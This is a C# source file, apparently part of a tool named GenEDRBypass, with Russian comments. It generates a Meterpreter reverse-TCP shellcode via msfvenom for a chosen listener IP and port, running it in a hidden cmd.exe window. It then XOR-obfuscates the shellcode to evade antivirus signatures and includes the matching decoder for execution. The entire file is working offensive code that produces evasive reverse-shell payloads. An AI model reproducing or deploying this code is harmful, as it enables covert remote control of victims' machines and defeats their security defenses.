using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace GenEDRBypass.Core
{
    public static class PayloadGenerator
    {
        // Генерация динамического шеллкода с использованием msfvenom
        public static byte[] GenerateShellcode(string ip, int port)
        {
            Console.WriteLine("Запуск генерации шеллкода с использованием msfvenom...");

            // Команда для генерации шеллкода с использованием msfvenom
            string msfvenomCommand = $"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f csharp";

            // Временный файл для сохранения сгенерированного шеллкода
            string tempFilePath = Path.GetTempFileName();

            try
            {
                // Запуск процесса для выполнения команды msfvenom
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {msfvenomCommand} > {tempFilePath}";
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();
                process.WaitForExit();

                // Чтение сгенерированного шеллкода из временного файла
                string shellcodeContent = File.ReadAllText(tempFilePath);
                
                Console.WriteLine("Шеллкод успешно сгенерирован. Выполняется парсинг...");

                // Преобразование полученного шеллкода в массив байтов
                return ParseShellcode(shellcodeContent);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка генерации шеллкода: {ex.Message}");
                throw;
            }
            finally
            {
                // Удаляем временный файл после использования
                if (File.Exists(tempFilePath))
                    File.Delete(tempFilePath);
            }
        }

        // Парсинг сгенерированного шеллкода в массив байтов
        private static byte[] ParseShellcode(string shellcodeContent)
        {
            try
            {
                string byteArrayPattern = @"\{([^}]+)\}";
                Match match = Regex.Match(shellcodeContent, byteArrayPattern);
                if (!match.Success)
                    throw new Exception("Шеллкод не найден в выводе msfvenom.");
                string byteArrayString = match.Groups[1].Value;
                string[] byteStrings = byteArrayString.Split(new[] { ',', ' ' }, StringSplitOptions.RemoveEmptyEntries);
                byte[] shellcodeBytes = new byte[byteStrings.Length];
                for (int i = 0; i < byteStrings.Length; i++)
                {
                    shellcodeBytes[i] = Convert.ToByte(byteStrings[i], 16); // Преобразуем строку в байт
                }

                Console.WriteLine($"Парсинг завершен. Количество байтов в шеллкоде: {shellcodeBytes.Length}");
                return shellcodeBytes;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при парсинге шеллкода: {ex.Message}");
                throw;
            }
        }

        // Метод для модификации шеллкода для обхода сигнатур антивирусов
        public static byte[] ObfuscateShellcode(byte[] shellcode)
        {
            Console.WriteLine("Выполняется обфускация шеллкода для обхода сигнатур...");

            byte key = (byte)new Random().Next(1, 255); // Используем случайный ключ для XOR-шифрования
            byte[] obfuscatedShellcode = new byte[shellcode.Length];

            for (int i = 0; i < shellcode.Length; i++)
            {
                obfuscatedShellcode[i] = (byte)(shellcode[i] ^ key); // Применяем XOR-шифрование
            }

            // Добавляем ключ в начало массива, чтобы потом его использовать при дешифровке
            byte[] finalShellcode = new byte[obfuscatedShellcode.Length + 1];
            finalShellcode[0] = key;
            Buffer.BlockCopy(obfuscatedShellcode, 0, finalShellcode, 1, obfuscatedShellcode.Length);

            Console.WriteLine("Обфускация завершена.");
            return finalShellcode;
        }

        // Метод для дешифровки обфусцированного шеллкода перед его исполнением
        public static byte[] DeobfuscateShellcode(byte[] obfuscatedShellcode)
        {
            byte key = obfuscatedShellcode[0];
            byte[] shellcode = new byte[obfuscatedShellcode.Length - 1];

            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)(obfuscatedShellcode[i + 1] ^ key); // Дешифруем каждый байт с использованием XOR
            }

            return shellcode;
        }
    }
}
